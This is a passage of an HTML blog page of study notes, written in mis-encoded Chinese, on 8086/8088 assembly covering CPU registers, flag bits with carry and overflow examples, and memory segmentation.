href="#1-6-åŸºæœ¬é€»è¾‘è¿ç®—" class="headerlink" title="1.6 åŸºæœ¬é€»è¾‘è¿ç®—"></a>1.6 åŸºæœ¬é€»è¾‘è¿ç®—</h2><div class="table-container"><table><thead><tr><th style="text-align:center">A</th><th style="text-align:center">B</th><th style="text-align:center">A &amp; B(ä¸)</th><th style="text-align:center">A \</th><th style="text-align:center">B(æˆ–)</th><th style="text-align:center">~A(é)</th><th>A ^ B(å¼‚æˆ–)</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr></tbody></table></div><h1 id="ç¬¬äºŒç« -IBM-PCå¾®æœºçš„åŠŸèƒ½ç»“æ„"><a href="#ç¬¬äºŒç« -IBM-PCå¾®æœºçš„åŠŸèƒ½ç»“æ„" class="headerlink" title="ç¬¬äºŒç«  IBM-PCå¾®æœºçš„åŠŸèƒ½ç»“æ„"></a>ç¬¬äºŒç«  IBM-PCå¾®æœºçš„åŠŸèƒ½ç»“æ„</h1><h2 id="2-1-IBM-PCå¾®æœºåŸºæœ¬ç»“æ„"><a href="#2-1-IBM-PCå¾®æœºåŸºæœ¬ç»“æ„" class="headerlink" title="2.1 IBM-PCå¾®æœºåŸºæœ¬ç»“æ„"></a>2.1 IBM-PCå¾®æœºåŸºæœ¬ç»“æ„</h2><p>äº”å¤§éƒ¨ä»¶ï¼šè¿ç®—å™¨ã€æ§åˆ¶å™¨ã€å­˜å‚¨å™¨ã€è¾“å…¥è®¾å¤‡ã€è¾“å‡ºè®¾å¤‡</p><p>CPU = è¿ç®—å™¨ + æ§åˆ¶å™¨</p><p>ä¸»æœº = è¿ç®—å™¨ + æ§åˆ¶å™¨ + å­˜å‚¨å™¨ï¼ˆä¸»å­˜ï¼‰                                   è¾…å­˜ï¼ˆå¤–å­˜ï¼‰ï¼Ÿ</p><p><img src="/2021/07/27/Code/Assembly/Assembly/7e2b02ddc644172d2b35675a8230ff25.bmp" alt="capture_20210722105104835" style="zoom:50%;">        <img src="/2021/07/27/Code/Assembly/Assembly/63f7bd40bbc511ac52a2e9ea9a4f9fae.bmp" alt="capture_20210722105250753" style="zoom:50%;"></p><p><img src="/2021/07/27/Code/Assembly/Assembly/1c2f76ff0ca07e1754e9285fbac67de8.bmp" alt="capture_20210721170839107" style="zoom:67%;"></p><h2 id="2-2-8086-8088-CPUå¯„å­˜å™¨ç»“æ„åŠå…¶ç”¨é€”"><a href="#2-2-8086-8088-CPUå¯„å­˜å™¨ç»“æ„åŠå…¶ç”¨é€”" class="headerlink" title="2.2 8086/8088 CPUå¯„å­˜å™¨ç»“æ„åŠå…¶ç”¨é€”"></a>2.2 8086/8088 CPUå¯„å­˜å™¨ç»“æ„åŠå…¶ç”¨é€”</h2><p><img src="/2021/07/27/Code/Assembly/Assembly/d609441390baa0354a34b60b6027077c.bmp" alt="capture_20210721171335429" style="zoom:50%;"></p><h3 id="ä¸€ã€é€šç”¨å¯„å­˜å™¨"><a href="#ä¸€ã€é€šç”¨å¯„å­˜å™¨" class="headerlink" title="ä¸€ã€é€šç”¨å¯„å­˜å™¨"></a>ä¸€ã€é€šç”¨å¯„å­˜å™¨</h3><p>lntel 8086 / 8088 æœ‰ 8 ä¸ª16 ä½é€šç”¨å¯„å­˜å™¨ï¼Œå®ƒä»¬å…·æœ‰è‰¯å¥½çš„é€šç”¨æ€§ï¼Œå¹¶ä¸”è¿˜å¯ä»¥ç”¨ä½œæŸä¸ªç‰¹å®šçš„åŠŸèƒ½ï¼Œå¯ä»¥ç”±ç¨‹åºè®¾è®¡äººå‘˜è¿›è¡Œç¼–ç¨‹è®¿é—®ã€‚</p><h4 id="1ã€æ•°æ®å¯„å­˜å™¨"><a href="#1ã€æ•°æ®å¯„å­˜å™¨" class="headerlink" title="1ã€æ•°æ®å¯„å­˜å™¨"></a>1ã€æ•°æ®å¯„å­˜å™¨</h4><ul><li><p>å®ƒåŒ…æ‹¬ AXã€BXã€CX å’Œ DX å››ä¸ªå¯„å­˜å™¨ã€‚å®ƒä»¬ä¸­çš„æ¯ä¸€ä¸ªæ—¢å¯ä»¥æ˜¯ <strong>16 ä½å¯„å­˜å™¨</strong>ï¼Œä¹Ÿå¯ä»¥åˆ†æˆä¸¤ä¸ª 8 ä½å¯„å­˜å™¨ä½¿ç”¨ï¼Œå³å¯ä»¥å½“ä½œ 8 ä¸ªç‹¬ç«‹çš„ <strong>8 ä½å¯„å­˜å™¨</strong>ä½¿ç”¨ã€‚</p></li><li><p>æ•°æ®å¯„å­˜å™¨æ—¢å¯ä»¥ç”¨æ¥å­˜æ”¾å‚åŠ è¿ç®—çš„<strong>æ“ä½œæ•°</strong>ï¼Œä¹Ÿå¯ä»¥å­˜æ”¾<strong>è¿ç®—çš„ç»“æœ</strong>ã€‚åœ¨å¤šæ•°æƒ…å†µä¸‹ï¼Œä½¿ç”¨è¿™äº›å¯„å­˜å™¨æ—¶å¿…é¡»<strong>åœ¨æŒ‡ä»¤ä¸­æ˜ç¡®æŒ‡ç¤º</strong>ã€‚</p><p>ä¾‹ï¼šMOV AXï¼ŒBX;     å°† BX çš„å†…å®¹é€åˆ° AX ä¸­</p><pre><code>    ADD CHï¼ŒDH;    å°† DH å’Œ CH çš„å†…å®¹ç›¸åŠ ï¼Œç»“æœé€åˆ°CH</code></pre></li><li><p>åœ¨æœ‰äº›æŒ‡ä»¤ä¸­ï¼Œä¸éœ€è¦æ˜ç¡®æŒ‡å‡ºä½¿ç”¨çš„å¯„å­˜å™¨åï¼Œå³éšå¿µä½¿ç”¨äº†æŸå¯„å­˜å™¨ï¼Œç§°ä¸º<strong>éšå«ä½¿ç”¨</strong>ã€‚</p><p>ä¾‹å¦‚ï¼Œåœ¨å¾ªç¯æŒ‡ä»¤ LOOP ä¸­ï¼ŒCX è¢«éšå«æŒ‡å®šä½œå¾ªç¯æ¬¡æ•°è®¡æ•°ç”¨ã€‚</p></li><li><p>ä¸ªåˆ«æŒ‡ä»¤å¯¹å¯„å­˜å™¨æœ‰ç‰¹å®šçš„ä½¿ç”¨ï¼Œå¹¶ä¸”åˆå¿…é¡»åœ¨æŒ‡ä»¤ä¸­æŒ‡æ˜å®ƒçš„åå­—ï¼Œè¿™ç±»å¯„å­˜å™¨çš„ä½¿ç”¨ç§°ä¸º<strong>ç‰¹å®šä½¿ç”¨</strong>ã€‚</p><p>ä¾‹å¦‚ï¼Œç§»ä½æŒ‡ä»¤ SHL AXï¼ŒCL            CLè¢«å›ºå®šç”¨ä½œç§»ä½æ¬¡æ•°</p></li></ul><h4 id="2ã€æŒ‡é’ˆå¯„å­˜å™¨"><a href="#2ã€æŒ‡é’ˆå¯„å­˜å™¨" class="headerlink" title="2ã€æŒ‡é’ˆå¯„å­˜å™¨"></a>2ã€æŒ‡é’ˆå¯„å­˜å™¨</h4><p>æŒ‡é’ˆå¯„å­˜å™¨æœ‰<strong>å †æ ˆæŒ‡é’ˆ SP</strong> å’Œ<strong>åŸºå€æŒ‡é’ˆ BP</strong>ï¼Œå®ƒä»¬ä¸€èˆ¬è¢«ç”¨æ¥å­˜æ”¾16 ä½åœ°å€ï¼Œåœ¨å½¢æˆ20 ä½çš„ç‰©ç†åœ°å€æ—¶å¸¸è¢«ä½œä¸º<strong>åç§»é‡</strong>ä½¿ç”¨ã€‚</p><ul><li><p>SP æŒ‡é’ˆï¼šåœ¨è¿›è¡Œå †æ ˆæ“ä½œæ—¶ï¼Œè¢«éšå«ä½¿ç”¨ï¼Œè¢«ç”¨æ¥æŒ‡å‘å †æ ˆé¡¶éƒ¨å•å…ƒã€‚</p></li><li><p>BP æŒ‡é’ˆï¼šè¢«ç”¨æ¥æŒ‡å‘å †æ ˆæ®µå†…æŸä¸€å­˜å‚¨å•å…ƒã€‚BP é™¤ç”¨ä½œåœ°å€æŒ‡é’ˆå¤–ä¹Ÿå¯ä»¥åƒæ•°æ®å¯„å­˜å™¨ä¸€æ ·ï¼Œå­˜æ”¾å‚åŠ è¿ç®—çš„æ“ä½œæ•°å’Œè¿ç®—çš„ç»“æœã€‚</p></li></ul><h4 id="3ã€å˜å€å¯„å­˜å™¨"><a href="#3ã€å˜å€å¯„å­˜å™¨" class="headerlink" title="3ã€å˜å€å¯„å­˜å™¨"></a>3ã€å˜å€å¯„å­˜å™¨</h4><p>æœ‰ä¸¤ä¸ª16 ä½çš„å˜å€å¯„å­˜å™¨ SI å’Œ DI ï¼Œä¸€èˆ¬è¢«ç”¨æ¥ä½œåœ°å€æŒ‡é’ˆã€‚</p><ul><li>SIï¼š æºå˜å€å¯„å­˜å™¨                </li><li>DIï¼šç›®çš„å˜å€å¯„å­˜å™¨</li><li>åŒ BP å¯„å­˜å™¨ä¸€æ ·ï¼ŒSI å’ŒDI ä¹Ÿå¯ä»¥ç”¨ä½œé€šç”¨æ•°æ®å¯„å­˜å™¨å­˜æ”¾æ“ä½œæ•°å’Œè¿ç®—ç»“æœã€‚</li></ul><h3 id="äºŒã€æ®µå¯„å­˜å™¨"><a href="#äºŒã€æ®µå¯„å­˜å™¨" class="headerlink" title="äºŒã€æ®µå¯„å­˜å™¨"></a>äºŒã€æ®µå¯„å­˜å™¨</h3><blockquote><ul><li>8086/8088 CPUåœ¨ä½¿ç”¨å­˜å‚¨å™¨æ—¶ï¼Œå°†å®ƒåˆ’åˆ†æˆè‹¥å¹²ä¸ªæ®µã€‚</li><li>æ¯ä¸ªæ®µç”¨æ¥å­˜æ”¾ä¸åŒçš„å†…å®¹ï¼Œå¦‚ç¨‹åºä»£ç ã€æ•°æ®ç­‰ç­‰ã€‚</li><li>æ¯ä¸ªå­˜å‚¨æ®µç”¨ä¸€ä¸ªæ®µå¯„å­˜å™¨æ¥æŒ‡æ˜è¯¥æ®µçš„èµ·å§‹ä½ç½®ï¼ˆä¹Ÿå«æ®µåŸºå€ï¼‰ ã€‚</li></ul></blockquote><p><img src="/2021/07/27/Code/Assembly/Assembly/19467d25513114d18bb275d548fe7131.bmp" alt="capture_20210722113810550"></p><p>CPU åœ¨è®¿é—®å­˜å‚¨å™¨æ—¶å¿…é¡»æŒ‡æ˜ä¸¤ä¸ªå†…å®¹ï¼š</p><blockquote><p>æ‰€è®¿é—®çš„å­˜å‚¨å•å…ƒå±äºå“ªä¸ªæ®µï¼Œå³æŒ‡æ˜ä½¿ç”¨çš„æ®µå¯„å­˜å™¨ã€‚<br>è¯¥å­˜å‚¨å•å…ƒä¸æ®µèµ·å§‹åœ°å€ï¼ˆæ®µåŸºå€ï¼‰çš„ç›¸è·å¤šå°‘ï¼Œå³åç§»é‡ã€‚</p></blockquote><p>åœ¨ç¨‹åºè®¾è®¡ä¸­ï¼Œä¸€ä¸ªç¨‹åºå°†å­˜å‚¨å™¨åˆ’åˆ†æˆå¤šå°‘ä¸ªå­˜å‚¨æ®µæ˜¯ä»»æ„çš„ã€‚ä½†åœ¨ç¨‹åºè¿è¡Œçš„ä»»ä½•æ—¶åˆ»æœ€å¤šåªæœ‰4 ä¸ªæ®µï¼Œåˆ†åˆ«ç”± CSã€DSã€ES å’Œ SS æŒ‡å®šã€‚</p><h3 id="ä¸‰ã€æŒ‡ä»¤æŒ‡é’ˆIP"><a href="#ä¸‰ã€æŒ‡ä»¤æŒ‡é’ˆIP" class="headerlink" title="ä¸‰ã€æŒ‡ä»¤æŒ‡é’ˆIP"></a>ä¸‰ã€æŒ‡ä»¤æŒ‡é’ˆIP</h3><ul><li><p>CPU åœ¨ä»å­˜å‚¨å™¨å–æŒ‡ä»¤æ—¶ï¼Œä»¥æ®µå¯„å­˜å™¨ CS ä½œä¸ºä»£ç æ®µçš„åŸºå€æŒ‡é’ˆï¼Œä»¥ IP çš„å†…å®¹ä½œä¸ºåç§»é‡ï¼Œå…±åŒå½¢æˆä¸€æ¡æŒ‡ä»¤çš„å­˜æ”¾åœ°å€ã€‚</p></li><li><p>å½“ CPU ä»å†…å­˜ä¸­å–å‡ºä¸€æ¡æŒ‡ä»¤åï¼ŒIP å†…å®¹è‡ªåŠ¨ä¿®æ”¹ä¸ºæŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p></li><li><p>æ³¨æ„ï¼šIP çš„å†…å®¹ä¸èƒ½è¢«ç›´æ¥è®¿é—®ï¼Œæ—¢ä¸èƒ½ç”¨æŒ‡ä»¤å»è¯»IPçš„å€¼ï¼Œä¹Ÿä¸èƒ½ç”¨æŒ‡ä»¤ç»™å®ƒèµ‹å€¼ã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡æŸäº›æŒ‡ä»¤çš„æ‰§è¡Œè€Œè‡ªåŠ¨ä¿®æ”¹ IP çš„å†…å®¹ã€‚</p><p>ä¾‹å¦‚ï¼Œä¸‹é¢ä¸¤ç§æŒ‡ä»¤å°±å¯ä»¥è‡ªåŠ¨æ”¹å˜ IP å¯„å­˜å™¨çš„å†…å®¹ã€‚</p><ul><li><p>è½¬ç§»æŒ‡ä»¤å°†æŒ‡ä»¤ä¸­çš„ç›®çš„åœ°å€çš„åç§»é‡é€å…¥ IP</p></li><li><p>å­ç¨‹åºè°ƒç”¨æŒ‡ä»¤CALL ï¼Œå°† IP åŸæœ‰å†…å®¹è‡ªåŠ¨å‹å…¥å †æ ˆï¼Œè€Œå°†å­ç¨‹åºçš„å…¥å£åœ°å€åç§»é‡è‡ªåŠ¨é€å…¥ IP ï¼Œ è€Œè¿”å›æŒ‡ä»¤ RETï¼Œåˆè‡ªåŠ¨ä»å †æ ˆä¸­å¼¹å›åŸæœ‰ IP çš„å†…å®¹ã€‚</p></li></ul></li></ul><h3 id="å››ã€æ ‡å¿—å¯„å­˜å™¨"><a href="#å››ã€æ ‡å¿—å¯„å­˜å™¨" class="headerlink" title="å››ã€æ ‡å¿—å¯„å­˜å™¨"></a>å››ã€æ ‡å¿—å¯„å­˜å™¨</h3><p>æ ‡å¿—å¯„å­˜å™¨æ˜¯ç”¨æ¥åæ˜ åœ¨ç¨‹åºè¿è¡Œæ—¶çš„æŸäº›çŠ¶æ€ï¼Œå¦‚æ˜¯å¦æœ‰è¿›ä½ã€å¥‡å¶æ€§ã€ç»“æœçš„ç¬¦å·ã€ç»“æœæ˜¯å¦ä¸ºé›¶ç­‰ç­‰ã€‚</p><p>8086/8088 CPU ä¸­æ ‡å¿—å¯„å­˜å™¨çš„é•¿åº¦ä¸º 16 ä½ï¼Œä½†åªå®šä¹‰äº†å…¶ä¸­çš„ 9 ä½ã€‚</p><p><img src="/2021/07/27/Code/Assembly/Assembly/7c3ee51819de1aee25c6d94028d26652.bmp" alt="capture_20210722144459045"></p><p>æ ‡å¿—ä½åˆ†ä¸ºï¼š</p><ul><li>çŠ¶æ€æ ‡å¿—ï¼šCFï¼ŒPFï¼ŒAFï¼ŒZFï¼ŒSFï¼ŒOF</li><li>æ§åˆ¶æ ‡å¿—ï¼šTFï¼ŒDEï¼ŒIF</li></ul><h4 id="1ã€è¿›ä½æ ‡å¿—ä½-CF"><a href="#1ã€è¿›ä½æ ‡å¿—ä½-CF" class="headerlink" title="1ã€è¿›ä½æ ‡å¿—ä½ CF"></a>1ã€è¿›ä½æ ‡å¿—ä½ CF</h4><p>åœ¨è¿›è¡Œæœ¯è¿ç®—æ—¶ï¼Œè‹¥æœ€é«˜ä½ï¼ˆ å¯¹å­—æ“ä½œæ˜¯ç¬¬ 15 ä½ï¼Œå­—èŠ‚æ“ä½œæ˜¯ç¬¬ 7 ä½ï¼Œäº§ç”Ÿè¿›ä½æˆ–å€Ÿä½æ—¶ CF è¢«è‡ªåŠ¨ç½® â€œ 1 â€ï¼Œå¦åˆ™ç½® â€œ 0 â€</p><p>åœ¨ç§»ä½ç±»æŒ‡ä»¤ä¸­ï¼ŒCF ä¹Ÿè¢«ç”¨æ¥å­˜æ”¾ä»æœ€é«˜ä½ï¼ˆå·¦ç§»æ—¶ï¼‰æˆ–æœ€ä½ä½ï¼ˆå³ç§»æ—¶ï¼‰ç§»å‡ºçš„æ•°å€¼ï¼ˆ0æˆ–1ï¼‰ã€‚</p><h4 id="2ã€å¥‡å¶æ ‡å¿—ä½-PF"><a href="#2ã€å¥‡å¶æ ‡å¿—ä½-PF" class="headerlink" title="2ã€å¥‡å¶æ ‡å¿—ä½ PF"></a>2ã€å¥‡å¶æ ‡å¿—ä½ PF</h4><p>å½“æŒ‡ä»¤æ“ä½œç»“æœçš„ä½ 8 ä½ä¸­å«æœ‰ 1 çš„ä¸ªæ•°ä¸ºå¶æ•°æ—¶ï¼Œåˆ™ PFè¢«ç½® 1ï¼Œå¦åˆ™ PF è¢«ç½® 0 ã€‚</p><p>æ³¨æ„ï¼šPF åªåæ˜ æ“ä½œç»“æœçš„ä½ 8 ä½çš„å¥‡å¶æ€§ï¼Œä¸æŒ‡ä»¤æ“ä½œæ•°çš„é•¿åº¦æ— å…³ã€‚</p><h4 id="3ã€è¾…åŠ©è¿›ä½æ ‡å¿—ä½-AF"><a href="#3ã€è¾…åŠ©è¿›ä½æ ‡å¿—ä½-AF" class="headerlink" title="3ã€è¾…åŠ©è¿›ä½æ ‡å¿—ä½ AF"></a>3ã€è¾…åŠ©è¿›ä½æ ‡å¿—ä½ AF</h4><p>åœ¨è¿›è¡Œç®—æœ¯è¿ç®—æ—¶ï¼Œè‹¥ä½å­—èŠ‚çš„ä½å››ä½å‘é«˜ 4 ä½äº§ç”Ÿè¿›ä½æˆ–å€Ÿä½ï¼Œå³ç¬¬ 3 ä½äº§ç”Ÿè¿›ä½æˆ–å€Ÿä½æ—¶ï¼ŒAFä½è¢«ç½® 1ï¼Œå¦åˆ™ç½®0 ã€‚AF æ ‡å¿—ä½ç”¨äºåè¿›åˆ¶è¿ç®—çš„è°ƒæ•´ã€‚</p><p>æ³¨æ„ï¼šAF åªåæ˜ è¿ç®—ç»“æœä½å…«ä½ï¼Œ ä¸æ“ä½œæ•°é•¿åº¦æ— å…³ã€‚</p><h4 id="4ã€é›¶å€¼æ ‡å¿—ä½-ZF"><a href="#4ã€é›¶å€¼æ ‡å¿—ä½-ZF" class="headerlink" title="4ã€é›¶å€¼æ ‡å¿—ä½ ZF"></a>4ã€é›¶å€¼æ ‡å¿—ä½ ZF</h4><p>è‹¥è¿ç®—ç»“æœå„ä½å…¨ä¸º 0ï¼Œåˆ™ ZF è¢«ç½® 1ï¼Œå¦åˆ™ç½® 0ã€‚</p><h4 id="5ã€ç¬¦å·æ ‡å¿—ä½-SF"><a href="#5ã€ç¬¦å·æ ‡å¿—ä½-SF" class="headerlink" title="5ã€ç¬¦å·æ ‡å¿—ä½ SF"></a>5ã€ç¬¦å·æ ‡å¿—ä½ SF</h4><p>å°†è¿ç®—ç»“æœè§†ä¸ºå¸¦ç¬¦å·æ•°ï¼Œå½“è¿ç®—ç»“æœä¸ºè´Ÿæ•°æ—¶ SF è¢«ç½®1 ï¼Œä¸ºæ­£æ•°æ—¶ï¼Œåˆ™ç½®0 ã€‚</p><p>ç”±äºç¬¬ 7 ä½æ˜¯å­—èŠ‚æ“ä½œæ•°çš„ç¬¦å·ä½ï¼Œè€Œç¬¬ 15 ä½æ˜¯å­—æ“ä½œæ•°çš„ç¬¦å·ä½ï¼Œå› æ­¤ï¼ŒSF ä½ä¸è¿ç®—ç»“æœçš„æœ€é«˜ä½ï¼ˆç¬¬7ä½æˆ–ç¬¬15ä½ï¼‰ ç›¸åŒã€‚</p><h4 id="6ã€æº¢å‡ºæ ‡å¿—ä½-OF"><a href="#6ã€æº¢å‡ºæ ‡å¿—ä½-OF" class="headerlink" title="6ã€æº¢å‡ºæ ‡å¿—ä½ OF"></a>6ã€æº¢å‡ºæ ‡å¿—ä½ OF</h4><p>å½“è¿ç®—ç»“æœè¶…è¿‡æœºå™¨ç”¨è¡¥ç æ‰€èƒ½è¡¨ç¤ºæ•°çš„èŒƒå›´æ—¶ï¼Œåˆ™ OF ç½®1 ï¼Œ å¦åˆ™ç½®0 ã€‚</p><blockquote><p>å­—èŠ‚æ•°æ®ï¼Œæœºå™¨ç”¨è¡¥ç æ‰€èƒ½è¡¨ç¤ºçš„æ•°èŒƒå›´ä¸ºï¼š -128 ~ +127<br>å­—æ•°æ®çš„è¡¨ç¤ºèŒƒå›´ä¸ºï¼š -32768 ~ +32767</p></blockquote><p>æ³¨æ„ï¼šæº¢å‡ºä¸è¿›ä½æ˜¯ä¸¤ä¸ªå®Œå…¨ä¸åŒçš„æ¦‚å¿µï¼Œä¸èƒ½ç›¸äº’æ··æ·†ã€‚ä¸‹é¢é€šè¿‡å‡ ä¸ªä¾‹å­æ¥è¯´æ˜</p><div class="table-container"><table><thead><tr><th>-85D + -1D = -86D</th><th>100D + 100D = 200D</th><th>-85D + -117D = -202D</th></tr></thead><tbody><tr><td>1010 1011 + 1111 1111</td><td>0110 0100 + 0110 0100</td><td>1010 1011 + 1000 1011</td></tr><tr><td>= (1) 1010 1010 = -86D</td><td>= 1100 1000 = -56D</td><td>= (1) 0011 0110 = 54D</td></tr><tr><td>CF = 1ï¼ŒOF = 0</td><td>CF = 0ï¼ŒOF = 1</td><td>CF = 1ï¼ŒOF = 1</td></tr><tr><td>æœ‰è¿›ä½ï¼Œæœªæº¢å‡ºï¼Œç»“æœæ­£ç¡®</td><td>æ— è¿›ä½ï¼Œæº¢å‡ºï¼Œç»“æœé”™è¯¯</td><td>æœ‰è¿›ä½ï¼Œæº¢å‡ºï¼Œç»“æœé”™è¯¯</td></tr></tbody></table></div><h4 id="7ã€å•æ­¥æ ‡å¿—ä½-TF-Trace-Flag"><a href="#7ã€å•æ­¥æ ‡å¿—ä½-TF-Trace-Flag" class="headerlink" title="7ã€å•æ­¥æ ‡å¿—ä½ TF (Trace Flag)"></a>7ã€å•æ­¥æ ‡å¿—ä½ TF (Trace Flag)</h4><p>å•æ­¥æ ‡å¿—ä¹Ÿå«è·Ÿè¸ªä½ï¼Œè¯¥æ ‡å¿—ä¸ºæ§åˆ¶æ ‡å¿—ä½ã€‚å•æ­¥æ ‡å¿—ä½ä¾›è°ƒè¯•ç¨‹åºä½¿ç”¨ã€‚</p><p>å½“ TF ä½è¢«è®¾ç½®ä¸º1 æ—¶ï¼Œæ¯æ‰§è¡Œä¸€æ¡æŒ‡ä»¤åï¼ŒCPU æš‚åœè¿è¡Œï¼Œå³äº§ç”Ÿå•æ­¥ä¸­æ–­ã€‚</p><h4 id="8ã€ä¸­æ–­å…è®¸æ ‡å¿—ä½-IF"><a href="#8ã€ä¸­æ–­å…è®¸æ ‡å¿—ä½-IF" class="headerlink" title="8ã€ä¸­æ–­å…è®¸æ ‡å¿—ä½ IF"></a>8ã€ä¸­æ–­å…è®¸æ ‡å¿—ä½ IF</h4><p>è¯¥æ ‡å¿—ä½ä¸ºæ§åˆ¶æ ‡å¿—ä½ã€‚å½“ IF è¢«è®¾ç½®ä¸º1 æ—¶ï¼ŒCPU å¯ä»¥å“åº”å¯å±è”½ä¸­æ–­ï¼Œå¦åˆ™ä¸å…è®¸å“åº”å¯å±è”½ä¸­æ–­ã€‚</p><h4 id="9ã€æ–¹å‘æ ‡å¿—ä½-DF"><a href="#9ã€æ–¹å‘æ ‡å¿—ä½-DF" class="headerlink" title="9ã€æ–¹å‘æ ‡å¿—ä½ DF"></a>9ã€æ–¹å‘æ ‡å¿—ä½ DF</h4><p>DF ä¹Ÿæ˜¯æ§åˆ¶æ ‡å¿—ä½ã€‚å®ƒè¢«ç”¨æ¥è§„å®šä¸²æ“ä½œæŒ‡ä»¤çš„å¢å‡æ–¹å‘ã€‚</p><p>å½“ DF = 0 æ—¶ï¼Œä¸²æ“ä½œæŒ‡ä»¤è‡ªåŠ¨ä½¿å˜å€å¯„å­˜å™¨ï¼ˆ SI å’Œ DI ï¼‰çš„å†…å®¹é€’å¢ã€‚å½“DF = 1 æ—¶ï¼Œä¸²æ“ä½œæŒ‡ä»¤è‡ªåŠ¨ä½¿å˜å€å¯„å­˜å™¨çš„å†…å®¹é€’å‡ã€‚</p><h2 id="2-3-å­˜å‚¨å™¨ç»„ç»‡ç»“æ„"><a href="#2-3-å­˜å‚¨å™¨ç»„ç»‡ç»“æ„" class="headerlink" title="2.3 å­˜å‚¨å™¨ç»„ç»‡ç»“æ„"></a>2.3 å­˜å‚¨å™¨ç»„ç»‡ç»“æ„</h2><h3 id="ä¸€ã€å­˜å‚¨å™¨çš„ç»„æˆ"><a href="#ä¸€ã€å­˜å‚¨å™¨çš„ç»„æˆ" class="headerlink" title="ä¸€ã€å­˜å‚¨å™¨çš„ç»„æˆ"></a>ä¸€ã€å­˜å‚¨å™¨çš„ç»„æˆ</h3><p><strong>1ã€å­˜å‚¨å™¨æ˜¯ç”±è‹¥å¹²ä¸ªå­˜å‚¨å•å…ƒæ„æˆ</strong></p><p>å­˜å‚¨å•å…ƒçš„å¤šå°‘å°±è¡¨ç¤ºäº†å­˜å‚¨å™¨çš„å®¹é‡ã€‚</p><p><strong>2ã€æ¯ä¸ªå­˜å‚¨å•å…ƒå­˜æ”¾ç›¸åŒé•¿åº¦çš„äºŒè¿›åˆ¶æ•°</strong></p><p>ä¸€ä¸ªå­˜å‚¨å•å…ƒçš„é•¿åº¦ä¸€èˆ¬ä¸º8 ä½äºŒè¿›åˆ¶æ•°ï¼Œå³ä¸€ä¸ªå­—èŠ‚ã€‚</p><p><strong>3ã€æ¯ä¸ªå­˜å‚¨å•å…ƒæœ‰ä¸€ä¸ªå”¯ä¸€çš„åœ°å€ç¼–å·â€”â€”â€”åœ°å€</strong></p><p>8086/8088 CPU æœ‰ 20 æ ¹åœ°å€çº¿ï¼Œå³å®ƒå¯ä»¥äº§ç”Ÿ20 ä½çš„åœ°å€ç ï¼Œå®ƒçš„å­˜å‚¨å™¨å¯»å€èƒ½åŠ›ä¸º 2^20ï¼Œå³1å…†å­—èŠ‚ï¼ˆ1 MBï¼‰ç©ºé—´ã€‚</p><p><img src="/2021/07/27/Code/Assembly/Assembly/d7a460c7cb1d0788e0b80edd6ffbab85.bmp" alt="capture_20210722162000483"></p><p><strong>4ã€ä»»ä½•ä¸¤ä¸ªç›¸é‚»å­—èŠ‚å•å…ƒå°±æ„æˆä¸€ä¸ªå­—å•å…ƒ</strong></p><p>ä¸€ä¸ªå­—å­˜å‚¨å•å…ƒï¼ˆWORDï¼‰ çš„é•¿åº¦ä¸º16 ä½äºŒè¿›åˆ¶æ•°ï¼Œå³ä¸¤ä¸ªå­—èŠ‚ã€‚å­—å•å…ƒçš„åœ°å€ä¸ºä¸¤ä¸ªå­—èŠ‚å•å…ƒä¸­<br>è¾ƒå°åœ°å€å­—èŠ‚å•å…ƒçš„åœ°å€ã€‚</p><p>16 ä½é•¿æ•°æ®çš„å­˜æ”¾è§„åˆ™æ˜¯ä½ 8 ä½æ”¾åœ¨è¾ƒä½åœ°å€å­—èŠ‚å•å…ƒä¸­ï¼Œé«˜ 8 ä½æ”¾åœ¨è¾ƒé«˜åœ°å€å­—èŠ‚å•å…ƒä¸­ã€‚</p><p>ä¾‹å¦‚ï¼Œå°†æ•° 3456H æ”¾åœ¨åœ°å€ä¸º 09235H çš„å­˜å‚¨å•å…ƒä¸­çš„å­˜å‚¨åˆ†é…ã€‚</p><p><img src="/2021/07/27/Code/Assembly/Assembly/e7fdd2178934bfd207df59c1240a0907.bmp" alt="capture_20210722165555215" style="zoom:80%;"></p><p><strong>5ã€åœ¨å®šä¹‰ä¸€ä¸ªåœ°å€æ—¶å¿…é¡»æŒ‡å‡ºæ˜¯å­—èŠ‚æˆ–å­—ç±»å‹å±æ€§</strong></p><h3 id="äºŒã€å­˜å‚¨å™¨çš„æ®µç»“æ„"><a href="#äºŒã€å­˜å‚¨å™¨çš„æ®µç»“æ„" class="headerlink" title="äºŒã€å­˜å‚¨å™¨çš„æ®µç»“æ„"></a>äºŒã€å­˜å‚¨å™¨çš„æ®µç»“æ„</h3><p>ç”±äº 8086/8088 å¯å¯»å€çš„å­˜å‚¨ç©ºé—´ä¸º 1 MBï¼Œéœ€è¦æä¾› 20 ä½é•¿çš„åœ°å€ç ã€‚è€Œ CPU å†…éƒ¨çš„å¯„å­˜å™¨é•¿åº¦åªæœ‰ 16 ä½ã€‚èƒ½å¤Ÿç›´æ¥è®¿é—®çš„æœ€å¤§åœ°å€ç©ºé—´æ˜¯ 64 KBã€‚</p><p>8086/8088 ç³»ç»Ÿçš„å­˜å‚¨å™¨æ®µç»“æ„å…·æœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š</p><p>1ã€8086/8088 CPU å°† 1 MB çš„å­˜å‚¨ç©ºé—´åˆ’åˆ†æˆè‹¥å¹²ä¸ªæ®µï¼Œæ¯ä¸ªæ®µæœ€å¤§é•¿åº¦ä¸º 64 Kï¼ˆ65536ï¼‰ä¸ªå­—èŠ‚å•å…ƒç»„æˆã€‚</p><p>åœ¨ 8086/8088 çš„æ±‡ç¼–è¯­è¨€æºç¨‹åºä¸­ï¼Œç”¨æˆ·å¯ä»¥æ 